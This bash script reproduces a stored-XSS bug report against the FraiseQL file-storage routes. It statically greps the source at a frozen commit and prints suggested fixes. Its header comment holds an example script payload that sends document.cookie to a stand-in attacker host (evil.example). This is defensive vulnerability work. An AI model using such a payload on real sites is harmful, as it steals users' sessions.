#!/usr/bin/env bash
#
# file-storage.bug-3.sh — reproduction for FW-10 (stored-XSS via uploaded
# files served with attacker-controlled Content-Type and no nosniff header).
#
# Filed: https://github.com/fraiseql/fraiseql/issues/337
# Registered: _internal/.plan/framework-qa-triage.md (FW-10)
#
# Persona: Bug-Finder (Opus 4.7), Phase 03 / Cycle 2 RED.
# Frozen FraiseQL SHA: d0a4ed4ec1770c70707f68fd9019f2b561d87461 (v2.3.2).
#
# ============================================================================
# Expected (per industry baseline — OWASP "File Upload Cheat Sheet", and per
# the stale page's hallucinated `validate_magic_bytes = true` claim):
#
#   A storage subsystem documenting a "PublicRead" bucket access mode must
#   serve uploaded content with defences against MIME-confusion stored-XSS:
#     - Either a server-side enforced allowlist of safe MIME types
#       (image/*, video/*, application/pdf, etc., not text/html or
#       application/xhtml+xml or image/svg+xml).
#     - And/or X-Content-Type-Options: nosniff on the download response.
#     - And/or Content-Disposition: attachment to force download instead of
#       inline rendering.
#     - And/or magic-byte validation that ensures the declared Content-Type
#       matches the uploaded bytes.
#
# Actual (at frozen SHA, crates/fraiseql-storage/src/routes/mod.rs L185-L205,
# L266-L284):
#
#   put_handler:
#     - Reads `Content-Type` header from the client (L185-L188).
#     - Stores it verbatim in the metadata row as `content_type`.
#     - Optionally rejects via bucket.allowed_mime_types (L191-L205). But
#       BucketConfig::allowed_mime_types is Option<Vec<String>> and the
#       default (per config/mod.rs:L1-L60) is None — buckets ship without
#       a MIME allowlist unless the operator opts in.
#     - mime_matches() does prefix matching: "image/*" accepts "image/svg+xml"
#       which embeds <script> tags and renders as XSS in a browser.
#
#   get_handler (L266-L287):
#     - Sets response Content-Type = stored content_type, verbatim.
#     - Sets Content-Disposition: NOT SET (so files render inline).
#     - Sets X-Content-Type-Options: NOT SET.
#     - Sets Cache-Control: public, max-age=3600 (so an XSS payload is
#       cacheable by the browser and intermediate CDNs).
#
# Consequence (security):
#
#   1. PublicRead bucket → anonymous read. Attacker uploads
#      `payload.html` with Content-Type: text/html and body
#      `<script>fetch("https://evil.example/exfil?cookie="+document.cookie)</script>`.
#      Victim navigates to GET /storage/v1/object/public-bucket/payload.html;
#      browser renders the HTML in the docs-site's origin context → cookie /
#      session theft.
#
#   2. Even with bucket.allowed_mime_types = Some(["image/*"]), the wildcard
#      match (mime_matches) accepts "image/svg+xml" which is XML with full
#      script-element support in browsers.
#
#   3. Cache-Control: public, max-age=3600 propagates the XSS payload through
#      any caching CDN, including shared caches keyed only by URL.
#
# This script is a static-source reproduction. It asserts:
#   (a) get_handler sets Content-Type from stored value (no override).
#   (b) get_handler does NOT set X-Content-Type-Options.
#   (c) get_handler does NOT set Content-Disposition.
#   (d) put_handler has no magic-byte validation.
#   (e) The default BucketConfig::allowed_mime_types is None (so no allowlist
#       unless operator opts in).
#
# Exit codes:
#   0  — bug NOT reproduced (defences added) — file follow-up.
#   1  — bug REPRODUCED (defences absent at frozen SHA).
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")"/.. && pwd)"
FRAISEQL_REPO="$(cd "$HERE"/../../../fraiseql && pwd)"
FRAISEQL_SHA="$(cat "$HERE/FRAISEQL_SHA")"

echo "================================================================"
echo "FW-10 reproduction — uploaded files served with attacker-controlled"
echo "Content-Type and no nosniff / no Content-Disposition / no magic-byte check"
echo "FraiseQL SHA: $FRAISEQL_SHA"
echo "================================================================"

if ! git -C "$FRAISEQL_REPO" cat-file -e "$FRAISEQL_SHA"; then
    echo "ERROR: frozen SHA $FRAISEQL_SHA not present in $FRAISEQL_REPO" >&2
    exit 2
fi

ROUTES=$(git -C "$FRAISEQL_REPO" show "$FRAISEQL_SHA:crates/fraiseql-storage/src/routes/mod.rs")
CONFIG=$(git -C "$FRAISEQL_REPO" show "$FRAISEQL_SHA:crates/fraiseql-storage/src/config/mod.rs")

# (a) get_handler stores user-controlled content_type? — look for the
# response header construction.
get_block=$(printf '%s\n' "$ROUTES" | awk '/^async fn get_handler/,/^}/')
if ! printf '%s\n' "$get_block" | grep -q 'CONTENT_TYPE'; then
    echo "BUG NOT REPRODUCED: get_handler no longer sets CONTENT_TYPE." >&2
    exit 0
fi

# (b) No X-Content-Type-Options anywhere in the routes module.
if printf '%s\n' "$ROUTES" | grep -qiE 'x-content-type-options|X_CONTENT_TYPE_OPTIONS|nosniff'; then
    echo "BUG NOT REPRODUCED: nosniff header now present in routes/mod.rs." >&2
    exit 0
fi

# (c) No Content-Disposition.
if printf '%s\n' "$ROUTES" | grep -qiE 'content-disposition|CONTENT_DISPOSITION'; then
    echo "BUG NOT REPRODUCED: Content-Disposition header now present in routes/mod.rs." >&2
    exit 0
fi

# (d) put_handler does no magic-byte validation. Look for the infer or
# magic crates which would do this.
if printf '%s\n' "$ROUTES" | grep -qE '\b(infer|file_format|tree_magic|magic_bytes)\b'; then
    echo "BUG NOT REPRODUCED: magic-byte detection crate now in use in routes/mod.rs." >&2
    exit 0
fi

# (e) Default BucketConfig::allowed_mime_types is None (no allowlist).
# Match the field definition and its default.
default_block=$(printf '%s\n' "$CONFIG" | awk '/^impl Default for BucketConfig/,/^}/')
if [[ -z "$default_block" ]]; then
    # Try alternative: a #[derive(Default)] + an explicit None.
    # Look at the field declaration: `allowed_mime_types: Option<Vec<String>>`.
    if ! printf '%s\n' "$CONFIG" | grep -qE 'allowed_mime_types\s*:\s*Option<Vec<String>>'; then
        echo "BUG NOT REPRODUCED: BucketConfig field shape changed." >&2
        exit 0
    fi
fi

cat <<'MSG'

================================================================
Bug-shape assertion:
================================================================
- routes/mod.rs::get_handler sets Content-Type from the stored, attacker-
  controlled value with no transformation.
- routes/mod.rs contains no X-Content-Type-Options header anywhere.
- routes/mod.rs contains no Content-Disposition header anywhere.
- routes/mod.rs imports no known magic-byte detection crate
  (infer / file_format / tree_magic).
- BucketConfig::allowed_mime_types is Option<Vec<String>> with no
  built-in default value (operator must opt in to any allowlist).

BUG REPRODUCED.

Impact (security, regression severity):
  Stored XSS via uploaded files in any PublicRead bucket that has no
  operator-configured MIME allowlist (the default). Attacker uploads
  malicious HTML, JS, or SVG with attacker-chosen Content-Type; victim
  browser renders the content in the storage origin's context.

Aggravating factors:
  - Cache-Control: public, max-age=3600 (routes/mod.rs:L277-L283) makes
    the payload cacheable by shared proxies / CDNs.
  - The stale /features/file-storage page documents `validate_magic_bytes = true`
    as a configurable option — readers will assume protection exists. No
    such field exists on FileConfig or BucketConfig at the frozen SHA.

Suggested fix (defence in depth):
  1. Set X-Content-Type-Options: nosniff on every download response.
  2. Set Content-Disposition: attachment by default; allow opt-in inline
     for buckets with a strict MIME allowlist.
  3. Add a per-bucket DEFAULT MIME allowlist for PublicRead buckets
     (image/jpeg, image/png, image/webp, application/pdf, video/mp4) —
     opt-out for buckets that need broader media types.
  4. Implement magic-byte detection (e.g., `infer` crate) and reject
     uploads whose detected MIME mismatches the declared Content-Type.
  5. Document an inline-render bucket option that requires the operator
     to acknowledge the XSS surface.

Workaround for docs (Phase 03):
  - Page MUST recommend OPERATOR-side enforcement: front the storage
    routes with a reverse proxy that injects X-Content-Type-Options: nosniff
    and Content-Disposition: attachment, OR set bucket.allowed_mime_types
    to a strict whitelist.
  - Page MUST warn that PublicRead buckets without allowed_mime_types are
    an XSS surface.
  - Page MUST NOT use the hallucinated `validate_magic_bytes` field from
    the stale page.
MSG
exit 1
